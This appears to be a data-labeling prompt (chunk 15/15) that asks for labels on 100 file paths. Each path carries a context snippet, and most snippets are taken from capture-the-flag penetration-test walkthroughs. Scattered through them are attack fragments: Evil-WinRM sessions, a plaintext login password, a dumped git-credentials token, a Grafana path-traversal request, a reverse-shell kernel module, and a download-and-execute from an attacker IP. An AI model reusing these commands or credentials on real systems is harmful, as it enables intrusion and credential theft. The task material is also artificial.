@@ -1,0 +1,203 @@
+Label these 100 paths (chunk 15/15).
+Reply with one jsonl code block, one record per path, in input order.
+
+1. /usr/src/app
+   context: ess group (16): Inappropriate ioctl for device bash: no job control in this shell root@5e5026ac6a81:/usr/src/app#
+2. C:\Users\Julian
+   context: PS C:\Users\Julian> tree /f Folder PATH listing Volume serial number is C458-8C08 C:. +---3D Objects +---Contacts +---
+3. /root/TeamCity/buildAgent/work/da3c5189dbf269a2
+   context: process group (632): Inappropriate ioctl for device bash: no job control in this shell root@watcher:/root/TeamCity/buildAgent/work/da3c5189dbf269a2#
+4. /school.flight.htb/prn.html
+   context: l       30w      306c http://school.flight.htb/prn 403      GET        9l       30w      306c http://school.flight.htb/prn.html 403      GET        9l       30w      306c http://school.flight.htb/prn.
+5. /usr/bin/zip
+   context: ackups/current/* /usr/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/ /usr/bin/zip -r "/var/backups/archive-$date.zip" /opt/backups/current/  count=$(/usr/bin/find "/var/
+6. /usr/bin/ansible-playbook
+   context: /playbooks/inventory.ini" #define PLAYBOOK_LOCATION "/opt/playbooks/" #define ANSIBLE_PLAYBOOK_BIN "/usr/bin/ansible-playbook" #define ANSIBLE_GALAXY_BIN "/usr/bin/ansible-galaxy" #define AUTH_KEY_HAS
+7. /run/dhclient.eth0.pid
+   context: ] root         711  0.0  0.1 101244  6048 ?        Ssl  12:20   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.le
+8. C:\Users\olivia\Documents
+   context: hliebedich  Evil-WinRM shell v3.5  Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\olivia\Documents>
+9. /home/app
+   context: ' root:x:0:0:root:/root:/bin/bash marco:x:1000:1000:marco:/home/marco:/bin/bash app:x:1001:1001:,,,:/home/app:/bin/bash
+10. /soccer.htb/ground4.jpg
+   context: 4253w   403502c http://soccer.htb/ground2.jpg 200      GET     2232l     4070w   223875c http://soccer.htb/ground4.jpg 200      GET      809l     5093w   490253c http://soccer.htb/ground1.jpg 200     
+11. C:\samples\app\hostfxr.dll
+   context: C:\samples\app\hostfxr.dll
+12. C:\Users\h.brown\desktop
+   context: *Evil-WinRM* PS C:\Users\h.brown\desktop> cat user.txt c0a3a31c************************
+13. C:\Users\L.Bianchi_adm\Documents
+   context: intage.htb  Evil-WinRM shell v3.7  Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\L.Bianchi_adm\Documents>
+14. C:\Windows\System32\spool\SERVERS\
+   context: TERS\*" /><FilePathCondition Path="C: \Windows\System32\spool\SERVERS:*" /><FilePathCondition Path="C:\Windows\System32\spool\SERVERS\*" /><FilePathCondition Path="C:\Windows\System32\Tasks:*" /><File
+15. /usr/bin/docker-proxy
+   context: root        2585  0.0  0.0 1745440 4608 ?        Sl   10:50   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 5000 -container-ip 172.21.0.2 -container-port 5000 -use-li
+16. /school.flight.htb/Index.php
+   context: w      425c http://school.flight.htb/server-status 200      GET       91l      412w     3996c http://school.flight.htb/Index.php 403      GET        9l       30w      306c http://school.flight.htb/con
+17. /var/www/web/cloud-gateway/src/main/resources/application.yaml
+   context: ta java -Xms100m -Xmx200m -XX:+UseG1GC -jar target/demo-0.0.1-SNAPSHOT.jar --spring.config.location=/var/www/web/cloud-gateway/src/main/resources/application.yaml www-data    1402  0.3  7.8 2823988 31
+18. /home/bcase
+   context: e$ cat /etc/passwd | grep 'sh$' root:x:0:0:root:/root:/bin/bash bcase:x:1000:1000:Bryce Case Jr.,,,:/home/bcase:/bin/bash postgres:x:102:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash e
+19. /home/babywyrm
+   context: eback:~$ cat /etc/passwd | grep 'sh$' root:x:0:0:root:/root:/bin/bash babywyrm:x:1000:1000:babywyrm:/home/babywyrm:/bin/bash
+20. C:\users\gale.dekarios\desktop\user.txt
+   context: 9qCKDosXo6 (Pwn3d!) RDP         10.129.234.64   3389   LOCK             [+] Executing command: type C:\users\gale.dekarios\desktop\user.txt with delay 5 seconds RDP         10.129.234.64   3389   LOCK
+21. /usr/local/labelgeneration/template.ps
+   context: ur virtual printer gets fixed     pdf_output = os.path.join(temp_dir, "output.pdf")      with open("/usr/local/labelgeneration/template.ps", "r") as postscript_file:         file_content = postscript_
+22. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_070
+   context: file or directory (2) [2415:2418:0309/174909.487773:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_070": No such file or director
+23. /etc/ssl/certs/ssl-cert-snakeoil.pem
+   context: ES chown_username=ftp secure_chroot_dir=/var/run/vsftpd/empty pam_service_name=vsftpd rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key ssl
+24. /usr/bin/jq
+   context: rror: File '$json_file' not found."     exit 1 fi  allowed_paths=("/var/" "/home/")  updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")  /usr/bin/echo "$upd
+25. /img/angy.jpg
+   context: <?xml version="1.0" encoding="UTF-8"?> <credits>   <author>damian</author>   <image>     <uri>/img/angy.jpg</uri>     <views>1</views>   </image>   <image>     <uri>/img/shy.jpg</uri>     <views>0</vi
+26. /tmp/index
+   context: Connecting to 10.10.14.6 (10.10.14.6:80) saving to '/tmp/index' index                100% |********************************|   532  0:00:00 ETA '/tmp/index' saved
+27. /data/gitea/conf/app.ini
+   context: /data/gitea/conf/app.ini
+28. /usr/bin/ls
+   context: $service is down, restarting!!!" | /usr/bin/mail -s "$service is down!!!" root     latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)     /bin/
+29. /css/app.3e20ea60.css
+   context: <link rel="icon" href="/favicon.ico">         <title>Internal Chat</title>         <link href="/css/app.3e20ea60.css" rel="preload" as="style">         <link href="/js/app.52b61e62.js" rel="preload" a
+30. /usr/local/tomcat
+   context: m/java-1.8-openjdk/jre\",\"JAVA_VERSION=8u151\",\"JAVA_ALPINE_VERSION=8.151.12-r0\",\"CATALINA_HOME=/usr/local/tomcat\",\"TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-lib\",\"LD_LIBRARY_PATH=/usr
+31. /stocker.htb/img/webp/interior29.webp
+   context: l       10w      162c http://stocker.htb/img/webp/ 200      GET      176l     1153w    89907c http://stocker.htb/img/webp/interior29.webp 200      GET      321l     1360w    15463c http://stocker.htb/
+32. /app/duplicati/Duplicati.Server.exe
+   context: d-hostnames=* root         160  0.3  1.5 1109184 62876 ?       Sl   21:24   0:01 /usr/bin/mono-sgen /app/duplicati/Duplicati.Server.exe --webservice-interface=any --server-datafolder=/config --webserv
+33. /var/log/nginx/openmediavault-webgui_access.log
+   context: x_body_size 25M;     error_log /var/log/nginx/openmediavault-webgui_error.log error;     access_log /var/log/nginx/openmediavault-webgui_access.log combined;     error_page 404 = $scheme://$host:$serv
+34. C:\ProgramData\
+   context: C:\ProgramData\
+35. E:\windows\ntds\ntds.dit
+   context: *Evil-WinRM* PS C:\programdata> copy E:\windows\ntds\ntds.dit . Access to the path 'E:\windows\ntds\ntds.dit' is denied. At line:1 char:1 + copy E:\windows\ntds\
+36. C:\Users\U\source\repos\SMBFilterDemo\SMBFilterDemo\Program.cs:line
+   context: tType transport, Boolean enableSMB1, Boolean enableSMB2)    at SMBFilterDemo.Program.RunServer() in C:\Users\U\source\repos\SMBFilterDemo\SMBFilterDemo\Program.cs:line 63    at SMBFilterDemo.Program.M
+37. C:\Users\edward.martin\Desktop
+   context: as edward.martin evil-winrm-py PS C:\Users\edward.martin\Documents> cd ..\Desktop evil-winrm-py PS C:\Users\edward.martin\Desktop> type user.txt 24bcc3d9************************
+38. /usr/lib/x86_64-linux-gnu/liblua5.1.so.0.0.0
+   context: mith@shared:~$ ls /usr/lib/x86_64-linux-gnu/liblua5.1.so* /usr/lib/x86_64-linux-gnu/liblua5.1.so.0  /usr/lib/x86_64-linux-gnu/liblua5.1.so.0.0.0
+39. /hathor.windcorp.htb/Secure/Login.aspx
+   context: http://hathor.windcorp.htb/Secure/Login.aspx?returnurl=%2f
+40. C:\programdata\2.0.1
+   context: \programdata> expand-archive NtObjectManager.zip -destinationpath . PS C:\programdata> cd 2.0.1  PS C:\programdata\2.0.1> ls      Directory: C:\programdata\2.0.1  Mode                 LastWriteTime   
+41. /src/import.ts
+   context: "./src/background.ts",     content: "./src/content.ts",     popup: "./src/popup.ts",     import: "./src/import.ts",     options: "./src/options.ts",     qrdebug: "./src/qrdebug.ts",     permissions: "
+42. C:\Users\devdoc\Documents
+   context: y$ evil-winrm -i meddigi.htb -u devdoc -p '1g0tTh3R3m3dy!!'  Evil-WinRM shell v3.4  *Evil-WinRM* PS C:\Users\devdoc\Documents>
+43. /home/aleks
+   context: www-data@down:/home/aleks$ find . -type f ./.bashrc ./.sudo_as_admin_successful ./.local/share/pswm/pswm find: './.cache': Pe
+44. /home/hist
+   context: /home/hist
+45. /etc/consul.d/consul.hcl
+   context: 36 ?        Ssl  17:14   0:00 /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl
+46. /usr/lib/ruby/2.7.0/net/protocol.rb
+   context: '         32: from /opt/update_dependencies.rb:10:in `list_from_file' ...[snip]...          1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write' /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `syste
+47. /root/psk/hostapd_other0.conf
+   context: d $IP_8.1/24 dev $WLAN_MGTTLS  # PSK Other ip addr add $IP_OTHER0.1/24 dev $WLAN_OTHER0 hostapd_aps /root/psk/hostapd_other0.conf > /var/log/hostapd_other0.log &  ip addr add $IP_OTHER1.1/24 dev $WLAN
+48. C:\USERS\MARK.ADAMS
+   context: py PS C:\Users\mark.adams> tree /f . Folder PATH listing Volume serial number is 0000025F 3985:943C C:\USERS\MARK.ADAMS +---Desktop +---Documents +---Downloads +---Favorites +---Links +---Music +---Pi
+49. /handlers/changePassword.ashx
+   context: POST /handlers/changePassword.ashx HTTP/1.1 Host: 127.0.0.1:8009 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/2
+50. /home/service/.bash_logout
+   context: * NFS         10.129.234.160    41393  10.129.234.160     1337       r--      220.0B         /home/service/.bash_logout                    * NFS         10.129.234.160    41393  10.129.234.160     133
+51. C:\programdata\shell.ps1
+   context: PS C:\> New-Win32Process -Commandline 'C:\programdata\gp.exe -cmd "powershell C:\programdata\shell.ps1 2>&1"' -token $token  Process            : gp.exe Thread             : thread:3264 - process:2760
+52. /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+   context: www-data@dump:/var/cache/captures$ touch /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa www-data@dump:/var/cache/captures$ sudo tcpdump -c10 -w/var/cache/captures/a/../../../../dev/sh
+53. /usr/sbin/getcap
+   context: jhudson@gofer:~$ /usr/sbin/getcap -r / 2>/dev/null /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_s
+54. /lib/Mono.Unix.so
+   context: ux-gnu/Mono.Unix.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) openat(AT_FDCWD, "/lib/Mono.Unix.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) openat(AT_FDCWD, "/u
+55. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\B2ACCF2BABFB
+   context: \scripts\A32FF3AEAA23\AADE1BA2A3E3 RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\AC2210DC311B RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\B2ACCF2BABFB RW C:\Windows\SYSVOL\domain\scripts\A32FF
+56. /.cpr/browser.css
+   context: eet" media="screen" href="/.cpr/ui.css?_=7WOr">         <link rel="stylesheet" media="screen" href="/.cpr/browser.css?_=7WOr"> </head>  <body>         <div id="ops"></div>          <div id="op_search"
+57. /root/TeamCity/buildAgent/lib/net.sf.trove4j.trove4j.jar
+   context: t.jar:/root/TeamCity/buildAgent/lib/commons-codec.jar:/root/TeamCity/buildAgent/lib/app-wrapper.jar:/root/TeamCity/buildAgent/lib/net.sf.trove4j.trove4j.jar:/root/TeamCity/buildAgent/lib/agent-upgrade
+58. \\r\nnotepad
+   context: Any ``\n    -Description "Allow MSSQL access from any IP address"\r\nls \\users\\\r\ncd .\\Desktop\\\r\nnotepad root.txt\r\nnotepad C:\\Users\\mssqlsvc\\Desktop\\user.txt\r\ndir\r\ncmd /c "C:\\Program
+59. C:\Windows\System32
+   context: Info                  DISM   DISM OS Provider: PID=3316 TID=2288 Determined System directory to be C:\Windows\System32 - CDISMOSServiceManager::get_SystemDirectory 2025-05-16 23:05:24, Info           
+60. /opt/bkcrack-1.5.0-Linux/bkcrack
+   context: oxdf@hacky$ /opt/bkcrack-1.5.0-Linux/bkcrack -C backup.zip -c etc/passwd -P plain.zip -p passwd bkcrack 1.5.0 - 2022-07-07 [15:58:59] Z reductio
+61. C:\Windows\explorer.exe
+   context: pp_cw5n1h2txyewy\LockApp.exe  1852  1712  explorer.exe             x64   1        HOSPITAL\drbrown  C:\Windows\explorer.exe  2016  892   wsmprovhost.exe          x64   0        HOSPITAL\drbrown  C:\Wi
+62. C:\Users\keysvc
+   context: PS C:\Users\keysvc> cat automation.txt 01000000d08c9ddf0115d1118c7a00c04fc297eb01000000341bbb10d13d3e44aed494db4d7c707
+63. C:\Snort\lib\snort_dynamicpreprocessor\0xdf.dll
+   context: *Evil-WinRM* PS C:\Snort\lib\snort_dynamicpreprocessor> upload 0xdf.dll Info: Uploading 0xdf.dll to C:\Snort\lib\snort_dynamicpreprocessor\0xdf.dll  Data: 12288 bytes of 12288 bytes copied
+64. C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
+   context: PS C:\> cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs Junction created for C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 <<==
+65. /stocker.htb/img/webp/people23.webp
+   context: http://stocker.htb/fonts/inter-v12-latin-500.woff2 200      GET       39l      197w    15603c http://stocker.htb/img/webp/people23.webp 200      GET     2059l    12963w   984134c http://stocker.htb/im
+66. C:\Windows\System32\drivers\etc\hosts
+   context: C:\Windows\System32\drivers\etc\hosts
+67. /home/cschultz
+   context: home/sbrown:/bin/bash lpelt:x:1003:1004::/home/lpelt:/bin/bash cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
+68. /usr/bin/df
+   context: me" +"%d/%m/%Y %H:%M") /usr/bin/echo "Last Kernel Modification Time: $formatted_time"  disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}') /usr/bin/echo "Available disk space: $disk_space
+69. C:\windows\system32\msiexec.exe
+   context: created! [+] Persmissions successfully reseted! [*] Starting WMI installer. [*] Command to execute: C:\windows\system32\msiexec.exe /fa C:\windows\installer\8ad86.msi [*] Oplock! [+] File moved!
+70. /var/cache/man
+   context: n sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/m
+71. /home/service
+   context: oxdf@hacky$ cat passwd | grep service service:x:1337:1337:,,,,default password:/home/service:/bin/false
+72. C:\Users\svc_winrm
+   context: *Evil-WinRM* PS C:\Users\svc_winrm> tree /f . Folder PATH listing Volume serial number is 00000229 A5C3:6454 C:\USERS\SVC_WINRM +---3D
+73. /portal.guardian.htb/student/assignments.php
+   context: ission.php => http://portal.guardian.htb/login.php 302      GET        0l        0w        0c http://portal.guardian.htb/student/assignments.php => http://portal.guardian.htb/login.php 200      GET   
+74. /tmp/tmp7wvrduelprintgen
+   context: nerating PostScript file... Generating PDF (until the printer gets fixed...) Documents available in /tmp/tmp7wvrduelprintgen  neil@bookworm:~$ ls /tmp/tmp7wvrduelprintgen/ output.pdf  output.ps
+75. /home/developer/.git-credentials
+   context: bash-4.4$ java -jar EvilRMI.jar c0a4a2cfd9ce cat /home/developer/.git-credentials https://irogir:qybWiMTRg0sIHz4beSTUzrVIl7t3YsCj9@github.com
+76. /dev/shm/reverse-shell.ko
+   context: /reverse-shell.o   MODPOST /dev/shm/Module.symvers   CC [M]  /dev/shm/reverse-shell.mod.o   LD [M]  /dev/shm/reverse-shell.ko   BTF [M] /dev/shm/reverse-shell.ko Skipping BTF generation for /dev/shm/r
+77. /home/shirohige
+   context: t:~$ cat /etc/passwd | grep "sh$" root:x:0:0:root:/root:/bin/bash shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash
+78. /usr/bin/zmaudit.pl
+   context: zoneminder@surveillance:~$ ls /usr/bin/zm*.pl /usr/bin/zmaudit.pl        /usr/bin/zmonvif-trigger.pl  /usr/bin/zmtrack.pl /usr/bin/zmcamtool.pl      /usr/bin/zmpkg.p
+79. C:\Users\justin.bradley
+   context: *Evil-WinRM* PS C:\Users\justin.bradley> tree /f Folder PATH listing Volume serial number is 2804-C13F C:. +---Desktop ¦       user.txt ¦ +
+80. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\C10CDDE211FE
+   context: B0FAFDAF RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\BEC23D3B2F2A RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\C10CDDE211FE RW C:\Windows\S
+81. /../../../../../../../var/lib/grafana/grafana.db
+   context: oxdf@hacky$ curl --path-as-is http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db   % Total    % Received % Xferd  Average Speed   Time 
+82. E:\Windows
+   context: werShell Copyright (C) Microsoft Corporation. All rights reserved.  PS E:\> Compress-Archive -Path 'E:\Windows Server 2012 R2 - Backups\' -DestinationPath C:\ProgramData\Edrive.zip
+83. /etc/systemd/system/trail.service
+   context: rvice ● trail.service - Maltrail. Server of malicious traffic detection system      Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset: enabled)      Active: active (running) si
+84. C:\Users\management_svc\Documents
+   context: a6a1295584  Evil-WinRM shell v3.5  Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\management_svc\Documents>
+85. /var/www/stats/files/network.png
+   context: set terminal pngcairo size 350,262 enhanced font 'Verdana,10' set output '/var/www/stats/files/network.png'  set key top left set title "Network traffic" # Set first two line styles to blue (#0060ad) 
+86. C:\wapt\conf\ca-192.168.120.158.pem
+   context: x0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo= clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.cr
+87. \\.\pipe\ABC
+   context: PS C:\programdata> $pipe = New-NtNamedPipeFile \\.\pipe\ABC -Win32Path                                          PS C:\programdata> $job = Start-Job { $pipe.Lis
+88. C:\Users\M.SchoolBus
+   context: rd for m.schoolbus@FRIZZ.HTB:  oxdf@hacky$ ssh -k m.schoolbus@frizzdc.frizz.htb PowerShell 7.4.5 PS C:\Users\M.SchoolBus>
+89. /data/scripts/dbmonitor.sh
+   context: app_backup.sh */15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh * * * * * mysql /bin/bash /data/scripts/dbmonitor.sh
+90. /usr/bin/cp
+   context: graph:     type: 1_gbit_switch  hosts:   server:     network_node_id: 0     processes:     - path: /usr/bin/cp       args: /bin/bash /tmp/0xdf       start_time: 3s     - path: /usr/bin/chmod       arg
+91. C:\Users\sam.emerson\documents
+   context: res and improvements! https://aka.ms/PSWindows  PS C:\Users\sam.emerson\Desktop> cd ..\Documents PS C:\Users\sam.emerson\documents> ls      Directory: C:\Users\sam.emerson\documents  Mode             
+92. /cat.htb/index.php
+   context: 0c http://cat.htb/logout.php => http://cat.htb/ 200      GET      129l      285w     3075c http://cat.htb/index.php 301      GET        9l       28w      300c http://cat.htb/css => http://cat.htb/css/
+93. /src/main/java/com/eureka/Furni/Service/CustomUserDetails.java
+   context: rc/main/java/com/eureka/Furni/UMSApplication.java ./src/main/java/com/eureka/Furni/Model/User.java ./src/main/java/com/eureka/Furni/Service/CustomUserDetails.java ./src/main/java/com/eureka/Furni/Serv
+94. C:\Users\kioskUser0\Downloads\
+   context: PS C:\> copy C:\_admin\profiles.xml C:\Users\kioskUser0\Downloads\
+95. /usr/bin/setfacl
+   context: if [ ! -f "$target" ]; then     /usr/bin/echo "Target must be a file."     exit 1 fi  /usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
+96. /tmp/runc/rootfs
+   context: babywyrm@giveback:~$ mkdir -p /tmp/runc/rootfs babywyrm@giveback:~$ cd /tmp/runc/ babywyrm@giveback:/tmp/runc$
+97. /home/jeremy/docker/previous/public/examples/pwn
+   context: ple" {       ~ destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts" -> "/home/jeremy/docker/previous/public/examples/pwn" # forces replacement       ~ id               = "/
+98. /home/oxdf/.nxc/logs/DC_10.129.234.63_2025-08-15_113542_bloodhound.zip
+   context: Done in 0M 17S LDAP        10.129.234.63   389    DC               Compressing output into /home/oxdf/.nxc/logs/DC_10.129.234.63_2025-08-15_113542_bloodhound.zip oxdf@hacky$ mv /home/oxdf/.nxc/logs/DC
+99. \\updates.msu\r\n
+   context: 0de9f68605f02bd2.msu -O updates.exe\r\n.\\updates.exe.exe\r\n.\\updates.exe\r\nmove .\\updates.exe .\\updates.msu\r\n.\\updates.msu\r\ndel .\\updates.msu\r\n'
+100. /furni.htb/static/images/user.svg
+   context: 162c http://furni.htb/static/images/favicon.png 200      GET        4l       64w      555c http://furni.htb/static/images/user.svg 200      GET        9l      104w     1201c http://furni.htb/static/im
